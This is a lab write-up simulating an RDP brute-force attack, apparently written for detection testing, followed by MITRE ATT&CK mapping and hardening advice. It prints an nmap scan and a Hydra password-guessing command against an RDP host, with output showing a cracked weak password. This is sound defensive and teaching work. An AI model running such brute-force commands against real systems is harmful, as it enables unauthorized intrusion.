# Scenario
This report will demonstrate the tactics and techniques used by an attacker to identify endpoints accessible via Remote Desktop Protocol (RDP) and subsequently obtain valid credentials through the use of brute-force tools. The username of the victim was obtained using OSINT techniques, and the target organization was found to have a weak password policy, allowing commonly used password lists to be leveraged effectively.

As part of this demonstration, Network Level Authentication (NLA) will be deliberately disabled, which represents a significant security misconfiguration. Without NLA, RDP connections can proceed to the full graphical login interface without verifying credentials at the network layer. This not only exposes the system to brute-force attempts but also increases the risk of exploitation through unauthenticated RDP vulnerabilities.

The combination of weak password policies, exposed RDP access, and the absence of NLA creates a high-risk scenario that attackers can easily exploit to gain unauthorized access to internal systems. This report aims to simulate such an attack chain to generate security events for detection validation and highlight the importance of RDP hardening measures.

# Tools Used
Hydra
Kali Linux

# Attack steps
1. Identify Vulnerable endpoints on a network
Command used: `nmap -p 3389 192.168.1.113`
2.Target the RPC endpoint with known username and password list
Command Used: `hydra -t 1 -V -f -l attackerlab -P password_lists  rdp://192.168.1.113`
Output `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-25 06:40:13
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 10 login tries (l:1/p:10), ~10 tries per task
[DATA] attacking rdp://192.168.1.113:3389/
[ATTEMPT] target 192.168.1.113 - login "attackerlab" - pass "password" - 1 of 10 [child 0] (0/0)
[ATTEMPT] target 192.168.1.113 - login "attackerlab" - pass "123456" - 2 of 10 [child 0] (0/0)
[3389][rdp] host: 192.168.1.113   login: attackerlab   password: 123456
[STATUS] attack finished for 192.168.1.113 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-25 06:40:16

# MITRE ATT&CK Framework Mapping

The brute force attack on RDP credentials demonstrated in this report aligns with specific techniques outlined in the MITRE ATT&CK framework, which is widely used for categorizing and understanding adversary tactics and techniques.

T1110 - Brute Force:
This technique involves the repeated guessing of passwords or credentials to gain unauthorized access. In this demonstration, we leveraged brute force tools to systematically attempt password combinations against the Remote Desktop Protocol service.

T1021.001 - Remote Services: Remote Desktop Protocol (RDP):
This sub-technique under Remote Services describes the use of RDP as a method for lateral movement or initial access. The attack exploited exposed RDP endpoints with weak or guessable credentials to gain unauthorized access.

# Summary & Recommendations

This demonstration highlights how a combination of exposed RDP services, weak passwords, and lack of Network Level Authentication (NLA) significantly increase an organization's attack surface. Attackers can leverage automated tools such as Hydra to quickly compromise systems, potentially gaining persistent internal access.

Key recommendations include:

Enable Network Level Authentication (NLA): This adds a pre-authentication layer that blocks unauthenticated connections and mitigates brute-force attacks.

Implement strong password policies: Enforce complex passwords and regular changes to reduce the effectiveness of password lists.

Limit RDP exposure: Restrict RDP access using firewalls or VPNs to prevent unauthorized external access.

Monitor logs and alerts: Ensure SIEM and intrusion detection systems are tuned to detect repeated failed RDP login attempts.

